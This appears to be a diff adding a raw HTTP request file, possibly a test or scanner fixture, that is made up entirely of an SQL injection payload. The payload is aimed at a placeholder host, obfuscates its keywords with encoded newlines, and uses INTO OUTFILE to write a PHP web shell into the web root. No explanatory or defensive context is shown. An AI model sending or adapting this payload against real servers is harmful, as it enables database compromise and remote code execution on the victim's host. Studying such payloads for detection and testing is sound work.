@@ -1,0 +1,4 @@
+GET /a?path=1'%0ainto%0aoutfile%0a'/var/www/shell.php'--%0a- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
